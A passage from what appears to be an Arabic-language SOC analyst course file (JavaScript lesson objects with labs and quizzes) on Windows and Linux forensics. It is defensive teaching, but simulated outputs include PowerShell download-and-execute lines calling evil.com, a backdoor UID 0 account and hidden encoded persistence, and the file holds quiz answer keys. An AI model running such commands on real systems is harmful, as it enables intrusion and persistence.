<p>أعلى مستوى صلاحيات في الحاسوب؛ يمتلك وصولاً مباشراً وغير مقيد إلى عتاد الجهاز (المعالج، الذاكرة الفيزيائية، والقرص الصلب). تعمل فيه نواة ويندوز (<code>ntoskrnl.exe</code>) وبرامج تشغيل الأجهزة (Hardware Drivers). إذا حدث خطأ برمجي أو انهيار في هذا الوضع، تظهر شاشة الموت الزرقاء الشهيرة (BSOD).</p>

<h4>2. وضع المستخدم (Ring 3 - User Mode)</h4>
<p>تعمل فيه جميع التطبيقات العادية (المتصفح، برامج الأوفيس، ومحلل الـ SOC نفسه) بالإضافة لعمليات النظام الفرعية. لا يمكن لأي برنامج في وضع المستخدم الوصول مباشرة للذاكرة أو العتاد؛ بل يجب عليه طلب الإذن من النواة عبر واجهات نداءات النظام (System Calls / Windows APIs).</p>

<h4>3. نظام الملفات NTFS وأسراره الجنائية</h4>
<ul>
  <li><strong>جدول الملفات الرئيسي (Master File Table - MFT):</strong> قاعدة البيانات المركزية لقرص NTFS، يسجل كل ملف وموقعه وتوقيته وحجمه وصلاحياته. حتى عند حذف ملف، تبقى سجلاته في الـ MFT مما يسمح للمحقق الجنائي باسترجاعه.</li>
  <li><strong>تدفقات البيانات البديلة (Alternate Data Streams - ADS):</strong> ميزة في NTFS تسمح بتخزين بيانات إضافية مخفية خلف الملف الأساسي دون تغيير حجمه الظاهري! يستغل المهاجمون ADS لإخفاء ملفات تنفيذية خبيثة داخل ملف نصي بريء (مثل <code>calc.txt:malware.exe</code>).</li>
</ul>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي كشف تدفقات البيانات المخفية (NTFS ADS Detector)</span>
    <h4>اكتشاف ملف تنفيذي خبيث مخفي داخل ملف نصي بريء</h4>
  </div>
  <p>تفحص الملف النصي المشبوه باستخدام أمر فحص التدفقات البديلة في CMD:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> windows-cmd-ads</div>
    <pre class="terminal-code">C:\Users\Student\Documents> dir /R
 2026-11-07  09:14                34 notes.txt
 2026-11-07  09:14         1,452,032 notes.txt:payload.exe:$DATA  <-- HIDDEN MALWARE STREAM!
               1 File(s)             34 bytes
[ALERT] Alternate Data Stream detected with executable payload hidden behind benign text!</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('dir /R', 'standalone-term-body'); app.showToast('تم فحص تدفقات البيانات البديلة ADS', 'info');">فحص التدفقات المخفية: dir /R</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "كيف تستغل البرمجيات الخبيثة ميزة تدفقات البيانات البديلة (NTFS ADS) في نظام ويندوز؟",
          questionEn: "How do attackers exploit NTFS Alternate Data Streams (ADS)?",
          optionsAr: [
            "لإخفاء حمولات تنفيذية وبرمجيات خبيثة داخل أو خلف ملفات نصية أو صور بريئة دون تغيير حجمها الظاهري في متصفح الملفات",
            "لتسريع تشغيل ألعاب الفيديو على خوادم الشركات",
            "لمسح سجلات الـ Event Logs تلقائياً كل ساعة",
            "لترقية بطاقة الشاشة الفيزيائية"
          ],
          optionsEn: [
            "To hide executable payloads behind benign text or image files without altering their apparent size in Explorer",
            "To speed up games",
            "To auto-clear event logs",
            "To upgrade GPU hardware"
          ],
          correctIndex: 0,
          explanationAr: "تسمح خاصية ADS بإرفاق تدفق بيانات غير مرئي بالملف الأصلي، مما يجعل متصفح ويندوز يعرض الملف النصي بحجمه العادي بينما يختبئ ملف خبيث كامل في التدفق البديل."
        }
      },
      {
        id: "lesson-3-2",
        courseId: "course-3",
        number: "3.2",
        titleAr: "التشريح الكامل لعمليات ويندوز الأساسية (Windows Core Processes): كيف تميز الشرعي من الخبيث في (System, smss, csrss, wininit, services, lsass, svchost, explorer, taskhostw)؟",
        titleEn: "Windows Core Processes Anatomy: Legitimate vs Masquerading (System, smss, lsass, svchost, etc.)",
        duration: "55 min",
        theoryAr: `
<h3>أهم درس لمحلل الـ SOC: علم تشريح العمليات (Process Anatomy)</h3>
<p class="lead">لكي تكتشف المتسلل المتخفي داخل النظام، يجب أن تعرف شكل "المواطن الصالح" بدقة. يحاول المهاجمون دائماً تمويه ملفاتهم بأسماء شبيهة بالعمليات الأصلية لنظام ويندوز (مثل <code>scvhost.exe</code> بدلاً من <code>svchost.exe</code> أو <code>lsas.exe</code>). يوضح هذا الدرس المعايير الصارمة لتمييز كل عملية شرعية.</p>

<div class="table-responsive">
  <table class="cyber-table">
    <thead>
      <tr>
        <th>اسم العملية</th>
        <th>المسار الشرعي الوحيد</th>
        <th>العملية الأب الشرعية (Parent)</th>
        <th>عدد النسخ المسموح به</th>
        <th>المستخدم (User)</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><strong>System</strong></td>
        <td><code>ntoskrnl.exe</code></td>
        <td>لا يوجد أب (PID: 4 دائماً)</td>
        <td>نسخة واحدة فقط</td>
        <td>NT AUTHORITY\SYSTEM</td>
      </tr>
      <tr>
        <td><strong>smss.exe</strong> (Session Manager)</td>
        <td><code>C:\Windows\System32\</code></td>
        <td>System (PID 4)</td>
        <td>نسخة رئيسية واحدة (وتطلق نسخاً مؤقتة تموت فوراً)</td>
        <td>NT AUTHORITY\SYSTEM</td>
      </tr>
      <tr>
        <td><strong>csrss.exe</strong> (Client/Server Run-Time)</td>
        <td><code>C:\Windows\System32\</code></td>
        <td>smss.exe (لكن الأب يختفي وتصبح Orphan)</td>
        <td>نسختان أو أكثر (نسخة لكل جلسة)</td>
        <td>NT AUTHORITY\SYSTEM</td>
      </tr>
      <tr>
        <td><strong>wininit.exe</strong> (Windows Initialization)</td>
        <td><code>C:\Windows\System32\</code></td>
        <td>smss.exe</td>
        <td>نسخة واحدة فقط للجلسة 0</td>
        <td>NT AUTHORITY\SYSTEM</td>
      </tr>
      <tr>
        <td><strong>services.exe</strong> (Service Control Manager)</td>
        <td><code>C:\Windows\System32\</code></td>
        <td>wininit.exe</td>
        <td>نسخة واحدة فقط</td>
        <td>NT AUTHORITY\SYSTEM</td>
      </tr>
      <tr>
        <td><strong>lsass.exe</strong> (Local Security Authority)</td>
        <td><code>C:\Windows\System32\</code></td>
        <td>wininit.exe</td>
        <td>نسخة واحدة فقط دائماً</td>
        <td>NT AUTHORITY\SYSTEM</td>
      </tr>
      <tr>
        <td><strong>svchost.exe</strong> (Host for Services)</td>
        <td><code>C:\Windows\System32\</code></td>
        <td>services.exe دائماً</td>
        <td>عشرات النسخ المتزامنة مع وسيط <code>-k</code></td>
        <td>SYSTEM, NETWORK SERVICE, LOCAL SERVICE</td>
      </tr>
      <tr>
        <td><strong>explorer.exe</strong> (User GUI Shell)</td>
        <td><code>C:\Windows\</code> (وليس System32!)</td>
        <td>userinit.exe (يختفي الأب)</td>
        <td>نسخة واحدة لكل مستخدم مسجل دخول</td>
        <td>اسم المستخدم المسجل (Logged-on User)</td>
      </tr>
    </tbody>
  </table>
</div>

<h4>علامات الإنذار الأحمر (Process Red Flags) لمحلل الـ SOC:</h4>
<ul>
  <li>وجود أكثر من نسخة واحدة من عملية <code>lsass.exe</code> (يدل فوراً على مالوير أو أداة سرقة كلمات مرور كـ Mimikatz).</li>
  <li>عملية <code>svchost.exe</code> مسارها خارج <code>System32</code> (مثل وجودها في <code>Temp</code> أو <code>AppData</code>) أو أن أباها ليس <code>services.exe</code>!</li>
  <li>عملية <code>explorer.exe</code> مسارها داخل <code>System32</code> بدلاً من مجلد <code>C:\Windows</code> الرئيسي!</li>
</ul>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي كشف العمليات المزيفة (Process Masquerading Lab)</span>
    <h4>تحليل شجرة العمليات بواسطة Process Explorer</h4>
  </div>
  <p>شاهد هذا التقرير المستخرج من فحص العمليات واكتشف الشذوذ الأمني الصارخ:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> process-tree-analyzer</div>
    <pre class="terminal-code">PID: 4120 | Name: svchost.exe | Path: C:\Users\John\AppData\Roaming\svchost.exe  <-- FRAUDULENT PATH!
  Parent PID: 2190 (winword.exe)  <-- FRAUDULENT PARENT (Word spawned svchost?!)
  Command Line: "C:\Users\John\AppData\Roaming\svchost.exe" -c "powershell -enc aWV4..."
  User: DOMAIN\John (Not SYSTEM!)
[CRITICAL ALERT] Malicious executable masquerading as svchost spawned by malicious Word Macro!</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('Get-Process svchost | select Id, ProcessName, Path', 'standalone-term-body'); app.showToast('تم استعلام مسارات svchost الشرعية', 'info');">فحص مسار العمليات الشرعي في PowerShell</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "أي من الحالات التالية تعد مؤشراً قاطعاً على وجود نشاط خبيث واختراق في عمليات ويندوز الأساسية؟",
          questionEn: "Which of the following is a definitive red flag for malicious activity?",
          optionsAr: [
            "ظهور عملية باسم `svchost.exe` تم تشغيلها بواسطة برنامج Word (`winword.exe`) ومن مسار `AppData` بدلاً من `services.exe`",
            "وجود عملية باسم System تحمل PID يساوي 4 وتعمل بحساب SYSTEM",
            "وجود نسخة واحدة من lsass.exe تحت wininit.exe في مجلد System32",
            "وجود عملية explorer.exe في مسار C:\\Windows"
          ],
          optionsEn: [
            "A process named svchost.exe spawned by winword.exe running from AppData",
            "System process with PID 4 under SYSTEM",
            "Single lsass.exe under wininit in System32",
            "explorer.exe located in C:\\Windows"
          ],
          correctIndex: 0,
          explanationAr: "عملية svchost الشرعية يجب أن تنطلق حصراً من مجلد C:\\Windows\\System32 وتكون تابعة للأب services.exe ومحملة بوسيط `-k`؛ فانطلاقها من تطبيق مثل Word ومن مسار AppData دليل قاطع على ماكرو خبيث متخفٍ."
        }
      },
      {
        id: "lesson-3-3",
        courseId: "course-3",
        number: "3.3",
        titleAr: "سجل النظام (Windows Registry): شرح المفاتيح الخمسة الكبرى، ومفاتيح التشغيل التلقائي (Run / RunOnce) التي يختبئ فيها المالوير",
        titleEn: "Windows Registry Architecture (5 Hives) & Autostart Persistence Keys (Run/RunOnce)",
        duration: "50 min",
        theoryAr: `
<h3>قاعدة بيانات التكوين المركزية لويندوز: حيث تحفر البرمجيات الخبيثة أقدامها</h3>
<p class="lead">سجل النظام (Windows Registry) هو قاعدة البيانات الهرمية الضخمة التي تخزن كل إعدادات النظام وتفضيلات المستخدمين وتهيئة البرامج وعتاد الحاسوب. يعتبر الريجستري الوجهة المفضلة للمخترقين لتثبيت وجودهم الدائم (Persistence) ليعمل المالوير تلقائياً مع كل إعادة تشغيل للجهاز.</p>

<h4>المفاتيح الجذرية الخمسة الكبرى (The 5 Root Hives)</h4>
<ul>
  <li><strong>HKLM (HKEY_LOCAL_MACHINE):</strong> الإعدادات العامة للنظام بأكمله، تنطبق على كل المستخدمين (العتاد، الشبكة، الأمان، والبرامج المثبتة).</li>
  <li><strong>HKCU (HKEY_CURRENT_USER):</strong> إعدادات وتفضيلات المستخدم المسجل دخوله حالياً (خلفية الشاشة، إعدادات المتصفح، والبرامج الشخصية).</li>
  <li><strong>HKCR (HKEY_CLASSES_ROOT):</strong> ارتباطات امتدادات الملفات (File Associations) والمعلومات الخاصة بـ COM Objects.</li>
  <li><strong>HKU (HKEY_USERS):</strong> يحتوي على ملفات التكوين لجميع حسابات المستخدمين على الجهاز (بما في ذلك الحسابات الافتراضية).</li>
  <li><strong>HKCC (HKEY_CURRENT_CONFIG):</strong> معلومات تكوين العتاد الحالي المستخدم أثناء الإقلاع.</li>
</ul>

<h4>أشهر مفاتيح التشغيل التلقائي (Run & RunOnce Keys) التي يراقبها الـ SOC</h4>
<p>المفاتيح الأكثر استهدافاً من قبل برمجيات التجسس والفدية:</p>
<pre><code class="language-powershell"># التشغيل التلقائي لجميع مستخدمي الجهاز (يتطلب صلاحيات مدير Admin)
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

# التشغيل التلقائي للمستخدم الحالي فقط (لا يتطلب أي صلاحيات إدارية! هدف سهل للمالوير)
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></pre>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي فحص مفاتيح الإقلاع بالريجستري (Registry Hunter)</span>
    <h4>استعلام مفاتيح الـ Run للبحث عن استدعاءات خبيثة</h4>
  </div>
  <p>نفذ أمر الاستعلام عن مفتاح Run في فرع المستخدم الحالي:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> reg-query-console</div>
    <pre class="terminal-code">PS C:\> Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
OneDrive      : "C:\Users\John\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
WindowsUpdate : "powershell.exe -WindowStyle Hidden -enc SQBFAFgA..."  <-- MALICIOUS PERSISTENCE ENTRY!</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', 'standalone-term-body'); app.showToast('تم فحص مفتاح التشغيل التلقائي بالريجستري', 'info');">فحص مفتاح التشغيل التلقائي عبر CMD</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "لماذا تفضل برمجيات التجسس العادية زرع مسارات تشغيلها في فرع `HKCU\\...\\Run` بدلاً من فرع `HKLM\\...\\Run`؟",
          questionEn: "Why do attackers prefer HKCU Run keys over HKLM Run keys?",
          optionsAr: [
            "لأن التعديل على مفاتيح HKCU لا يتطلب صلاحيات مدير (Administrator) ويمكن للمالوير تنفيذه بصلاحيات الموظف العادي",
            "لأن مفاتيح HKCU مشفرة ولا يستطيع الـ Antivirus فحصها",
            "لأن نظام ويندوز يحذف فرع HKLM تلقائياً كل أسبوع",
            "لأن HKCU تجعل الحاسوب يعمل بدون كهرباء"
          ],
          optionsEn: [
            "Modifying HKCU requires no administrative privileges and can run under ordinary user context",
            "HKCU is encrypted",
            "HKLM is auto-deleted weekly",
            "It runs without electricity"
          ],
          correctIndex: 0,
          explanationAr: "مفتاح HKCU خاص بالمستخدم الحالي فقط، وبالتالي يمكن لأي تطبيق أو سكريبت خبيث يفتحه الموظف الكتابة فيه فوراً لتثبيت تشغيله الدائم دون إطلاق نافذة تحذير UAC ودون الحاجة لصلاحيات مدير النظام."
        }
      },
      {
        id: "lesson-3-4",
        courseId: "course-3",
        number: "3.4",
        titleAr: "خدمات ويندوز (Windows Services) والمهام المجدولة (Scheduled Tasks) و WMI وكيف يستغلها المهاجم للبقاء (Persistence)",
        titleEn: "Windows Services, Scheduled Tasks (Schtasks) & WMI Persistence Abuse",
        duration: "50 min",
        theoryAr: `
<h3>أذرع البقاء الخفية: كيف يضمن المهاجم استيقاظ برمجياته الخبيثة؟</h3>
<p class="lead">بمجرد اختراق جهاز، يخشى المهاجم أن يقوم المستخدم بإعادة تشغيل الحاسوب فينقطع اتصاله. لذلك يعتمد على ثلاث آليات رئيسية للبقاء (Persistence) والاستيقاظ الدوري.</p>

<h4>1. خدمات ويندوز (Windows Services - Event ID 7045)</h4>
<p>برامج تعمل في الخلفية دون الحاجة لتسجيل دخول مستخدم، وغالباً ما تعمل بأعلى الصلاحيات (<code>NT AUTHORITY\SYSTEM</code>). يقوم المهاجم بإنشاء خدمة خبيثة جديدة أو تعديل مسار خدمة موجودة (BinPath Manipulation) لتشغيل قذيفته العكسية.</p>

<h4>2. المهام المجدولة (Scheduled Tasks - Event ID 4698 / schtasks)</h4>
<p>أداة إدارة تتيح تنفيذ برامج أو سكريبتات في أوقات محددة أو عند أحداث معينة (مثل إقلاع النظام أو قفل الشاشة). يستغلها المهاجم لإعادة تنشيط اتصاله بالـ C2 كل 10 دقائق.</p>

<h4>3. مستودع الإدارة (WMI - Windows Management Instrumentation)</h4>
<p>أخطر تقنيات البقاء وأصعبها اكتشافاً لأنها تعمل بدون ملفات (Fileless Persistence) عبر ثلاثة مكونات:</p>
<ul>
  <li><strong>WMI Event Filter:</strong> يراقب وقوع حدث معين في النظام (مثل مرور 60 ثانية على إقلاع ويندوز).</li>
  <li><strong>WMI Event Consumer:</strong> يحدد الإجراء المطلوب تنفيذه عند وقوع الحدث (تشغيل كود VBScript أو PowerShell خبيث).</li>
  <li><strong>FilterToConsumerBinding:</strong> الربط البرمجي بين الفلتر والمستهلك.</li>
</ul>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي كشف المهام المجدولة المشبوهة (Schtasks Hunter)</span>
    <h4>استعلام المهام المجدولة النشطة على نظام ويندوز</h4>
  </div>
  <p>تفحص مخرجات استعلام المهام المجدولة في PowerShell:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> schtasks-viewer</div>
    <pre class="terminal-code">TaskName: \Microsoft\Windows\Maintenance\GoogleUpdateTask  <-- MASQUERADED NAME
TaskPath: \Microsoft\Windows\Maintenance\
Action:   powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/c2.ps1')"
Trigger:  At log on of any user - Repeat every 15 minutes indefinitely</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('Get-ScheduledTask | select TaskName, State', 'standalone-term-body'); app.showToast('تم استعلام المهام المجدولة', 'info');">فحص المهام المجدولة: Get-ScheduledTask</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "ما هو رقم حدث السجل (Event ID) الذي يُسجل في سجل النظام (System Log) عند قيام مهاجم أو مسؤول بتثبيت خدمة ويندوز جديدة (A new service was installed)؟",
          questionEn: "Which Event ID records the installation of a new Windows service?",
          optionsAr: [
            "Event ID 7045 (System Log)",
            "Event ID 4624 (Security Log)",
            "Event ID 1102 (Audit Cleared)",
            "Event ID 1000 (Application Error)"
          ],
          optionsEn: [
            "Event ID 7045 (System Log)",
            "Event ID 4624 (Security Log)",
            "Event ID 1102 (Audit Cleared)",
            "Event ID 1000 (Application Error)"
          ],
          correctIndex: 0,
          explanationAr: "يسجل ويندوز في سجل System الحدث الشهير Event ID 7045 في كل مرة يتم فيها تثبيت خدمة جديدة، ويتضمن اسم الخدمة، مسار الملف التنفيذي (ImagePath)، ونوع الحساب المشغل لها."
        }
      },
      {
        id: "lesson-3-5",
        courseId: "course-3",
        number: "3.5",
        titleAr: "سطر أوامر ويندوز (CMD) و PowerShell لمحلل الـ SOC (تحليل الأوامر المشفرة -enc Base64 و IEX و DownloadString)",
        titleEn: "Windows CMD & PowerShell for SOC Analysts: De-obfuscating Base64 (-enc), IEX & DownloadString",
        duration: "55 min",
        theoryAr: `
<h3>سلاح المدافعين وملاذ المهاجمين: تشريح قذائف الباورشيل المسمومة</h3>
<p class="lead">أصبح PowerShell الأداة الأكثر تفضيلاً للمهاجمين في تقنيات "العيش على موارد الأرض" (Living off the Land) لأنه مثبت مسبقاً على كل أنظمة ويندوز وموثوق به. يتعلم محلل الـ SOC في هذا الدرس كيف يفك تشفير الأوامر المعماة ويحلل محتواها الحقيقي.</p>

<h4>أهم وسائط ومؤشرات الخطورة في PowerShell:</h4>
<ul>
  <li><code>-NoProfile (-nop):</code> يمنع تحميل إعدادات المستخدم الشخصية لتسريع التنفيذ وتفادي القيود.</li>
  <li><code>-WindowStyle Hidden (-w hidden):</code> إخفاء النافذة السوداء للباورشيل تماماً حتى لا يلاحظ الموظف أي شيء على شاشته.</li>
  <li><code>-ExecutionPolicy Bypass (-ep bypass):</code> تجاوز سياسات الأمان التي تمنع تشغيل السكريبتات.</li>
  <li><code>-EncodedCommand (-enc):</code> تنفيذ أمر مشفر بصيغة Base64 بتنسيق Unicode UTF-16LE.</li>
  <li><code>IEX (Invoke-Expression):</code> تنفيذ أي نص كأمر برمجي فوري في الذاكرة.</li>
  <li><code>DownloadString:</code> تنزيل كود خبيث من الإنترنت وحقنه مباشرة في الذاكرة دون كتابة ملف على القرص (Fileless Execution).</li>
</ul>

<h4>خطوات فك تشفير أمر PowerShell مشفر بـ Base64:</h4>
<pre><code class="language-powershell"># كود فك التشفير القياسي لمحلل الـ SOC في بيئة آمنة:
$encoded = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA=="
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))

# النتيجة المفكوكة:
# IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')</code></pre>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي فك تشفير أوامر الباورشيل (PowerShell Deobfuscator)</span>
    <h4>فك تشفير سطر أوامر مشفر رُصد في سجل 4688</h4>
  </div>
  <p>شاهد فك شفرة الأمر الملتقط في السجلات:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> powershell-deobfuscator</div>
    <pre class="terminal-code">RAW INPUT: powershell.exe -nop -w hidden -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcASABhAGMAawBlAGQAJwA=
DECODED UTF-16LE: Write-Host 'Hacked'
ANALYSIS: Command executed hidden PowerShell console attempting to print confirmation payload.</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('powershell -Command \"[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\'VwByAGkAdABlAC0ASABvAHMAdAAgACcASABhAGMAawBlAGQAJwA=\'))\"', 'standalone-term-body'); app.showToast('تم فك التشفير بنجاح', 'success');">تشغيل فك التشفير في المحاكي</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "عندما يرى محلل الـ SOC أمر PowerShell يحتوي على الوسيط `-enc`، فبأي ترميز (Encoding) يجب فك نص الـ Base64 للحصول على النص المقروء الصحيح؟",
          questionEn: "In what encoding does PowerShell -enc decode Base64 strings?",
          optionsAr: [
            "ترميز Unicode (UTF-16LE)",
            "ترميز ASCII العادي فقط",
            "ترميز UTF-8",
            "ترميز Hexadecimal مقلوب"
          ],
          optionsEn: [
            "Unicode (UTF-16LE)",
            "Standard ASCII only",
            "UTF-8",
            "Reversed Hex"
          ],
          correctIndex: 0,
          explanationAr: "يتطلب وسيط `-EncodedCommand` في PowerShell نص Base64 مشفراً بترميز Unicode Little-Endian (UTF-16LE)؛ وإذا تم فكه بـ UTF-8 أو ASCII العادي ستظهر رموز غريبة وغير مقروءة."
        }
      },
      {
        id: "lesson-3-6",
        courseId: "course-3",
        number: "3.6",
        titleAr: "مدخل شامل إلى نظام Linux من الصفر: هيكلية النظام (/etc/passwd, /etc/shadow, /var/log, /proc, /tmp, /bin)",
        titleEn: "Linux Filesystem Hierarchy for SOC: /etc, /var/log, /proc, /tmp, /bin, passwd & shadow",
        duration: "50 min",
        theoryAr: `
<h3>شجرة نظام لينكس: أين تختبئ الأسرار والملفات الحساسة؟</h3>
<p class="lead">تعمل أغلب خوادم الويب والبنوك وقواعد البيانات العالمية على توزيعات لينكس (RedHat, Ubuntu, Debian). في لينكس، كل شيء عبارة عن ملف (Everything is a file)، حتى العمليات ومنافذ الشبكة وأجهزة العتاد!</p>

<h4>أهم المجلدات الحيوية التي يجب أن يعرفها محلل الـ SOC:</h4>
<ul>
  <li><strong><code>/etc</code> (Configuration Central):</strong> يحتوي على ملفات إعدادات النظام والخدمات:
    <ul>
      <li><code>/etc/passwd:</code> يحتوي على قائمة بجميع مستخدمي النظام وأرقامهم التعريفية (UID/GID) ومسارات مجلداتهم (يمكن لأي مستخدم قراءته).</li>
      <li><code>/etc/shadow:</code> يحتوي على كلمات المرور الحقيقية للمستخدمين مشفرة بالهاش (Salted Hashes). هذا الملف فائق الحساسية ولا يمكن قراءته إلا من قبل المستخدم الجذر <code>root</code> فقط!</li>
      <li><code>/etc/crontab:</code> ملف المهام المجدولة في لينكس.</li>
    </ul>
  </li>
  <li><strong><code>/var/log</code> (مركز السجلات الجنائية):</strong> المجلد الأهم لمحلل الـ SOC؛ يحتوي على جميع سجلات الدخول (<code>auth.log</code> أو <code>secure</code>)، وسجلات الـ Syslog، وسجلات سيرفرات Apache و Nginx.</li>
  <li><strong><code>/tmp</code> و <code>/dev/shm</code>:</strong> مجلدات مؤقتة تمتلك صلاحيات كتابة كاملة لأي مستخدم؛ الوجهة المفضلة للمهاجمين لتنزيل ملفاتهم الخبيثة وتشغيلها.</li>
  <li><strong><code>/proc</code> (Virtual Process Filesystem):</strong> نظام ملفات وهمي موجود في الذاكرة العشوائية RAM؛ يحتوي على مجلد لكل عملية تعمل حالياً برقم الـ PID الخاص بها، مما يسمح بفحص مسار تشغيلها وذاكرتها.</li>
</ul>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي فحص ملفات لينكس الحساسة (Linux Filesystem Inspector)</span>
    <h4>استعراض هيكل ملف /etc/passwd لكشف الحسابات المشبوهة</h4>
  </div>
  <p>تفحص أسطر ملف المستخدمين في خادم لينكس:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> linux-bash-terminal</div>
    <pre class="terminal-code">$ cat /etc/passwd | tail -n 3
sysadmin:x:1000:1000:System Admin,,,:/home/sysadmin:/bin/bash
mysql:x:115:122:MySQL Server,,,:/nonexistent:/bin/false
backdoor_root:x:0:0:Fake Service Account:/root:/bin/bash  <-- SUSPICIOUS UID 0!</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('cat /etc/passwd | grep \":0:\"', 'standalone-term-body'); app.showToast('تم فحص الحسابات ذات الصلاحيات الجذرية UID 0', 'info');">فحص الحسابات ذات صلاحيات Root (UID 0)</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "ما هو الفارق الجوهري بين ملف `/etc/passwd` وملف `/etc/shadow` في أنظمة لينكس؟",
          questionEn: "What is the key difference between /etc/passwd and /etc/shadow?",
          optionsAr: [
            "ملف `/etc/passwd` مقروء للجميع ويحتوي على بيانات المستخدمين ومعرفاتهم، بينما `/etc/shadow` مشفر ومحمي ولا يقرؤه إلا root ويحتوي على هاشات كلمات المرور",
            "ملف passwd مخصص لكتابة البريد الإلكتروني بينما shadow للألعاب",
            "لا يوجد أي فرق بينهما",
            "ملف shadow يحتوي فقط على صور المستخدمين الشخصية"
          ],
          optionsEn: [
            "/etc/passwd is readable by all users containing user accounts, while /etc/shadow is restricted to root containing salted password hashes",
            "passwd is for emails while shadow is for games",
            "No difference",
            "shadow contains user photos"
          ],
          correctIndex: 0,
          explanationAr: "تاريخياً كانت الهاشات تخزن في passwd مما سهل سرقتها، فتم عزل الهاشات المشفرة في ملف `/etc/shadow` الذي يتمتع بصلاحيات قراءة مشددة جداً تحصر الوصول للمستخدم الجذر (root) فقط."
        }
      },
      {
        id: "lesson-3-7",
        courseId: "course-3",
        number: "3.7",
        titleAr: "نظام الصلاحيات والمستخدمين في Linux (chmod, chown, sudo, SUID/SGID) وكيف يصعد الهكر صلاحياته (Privilege Escalation)",
        titleEn: "Linux Permissions & Privilege Escalation: chmod, chown, sudo & SUID/SGID Binaries",
        duration: "55 min",
        theoryAr: `
<h3>صلاحيات لينكس الصارمة والثغرات القاتلة لترقية الصلاحيات</h3>
<p class="lead">يعتمد أمان لينكس على تقسيم الصلاحيات إلى ثلاثة أطراف: المالك (User)، المجموعة (Group)، والآخرون (Others)، مع ثلاثة أفعال: القراءة (Read - 4)، الكتابة (Write - 2)، والتنفيذ (Execute - 1).</p>

<h4>1. بت الـ SUID (Set Owner User ID upon execution)</h4>
<p>ميزة في لينكس تسمح للمستخدم العادي بتشغيل ملف تنفيذي معين بصلاحيات مالك الملف (والذي غالباً ما يكون المستخدم الجذر <code>root</code>)، مثل برنامج <code>/usr/bin/passwd</code> لتغيير كلمة السر.</p>
<p><strong>الاستغلال الأمني وترقية الصلاحيات (SUID Privilege Escalation):</strong></p>
<p>إذا أخطأ مسؤول النظام وقام بتعيين بت الـ SUID لبرامج قادرة على تنفيذ أوامر أو قراءة ملفات (مثل <code>find</code>, <code>vim</code>, <code>bash</code>, <code>nmap</code>)، يستطيع المهاجم الذي يمتلك وصولاً كمستخدم عادي استغلالها لفتح قذيفة Root كاملة بثانية واحدة عبر ثغرات موثقة في مشروع <strong>GTFOBins</strong>!</p>

<h4>أمر البحث عن ملفات SUID المشبوهة لمحلل الـ SOC:</h4>
<pre><code class="language-bash">find / -perm -u=s -type f 2>/dev/null</code></pre>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي فحص ملفات SUID (SUID Misconfiguration Lab)</span>
    <h4>البحث عن ملفات تنفيذية ذات صلاحيات ترقية غير مألوفة</h4>
  </div>
  <p>تفحص نتائج أمر البحث عن ملفات الـ SUID:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> linux-suid-audit</div>
    <pre class="terminal-code">$ find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null
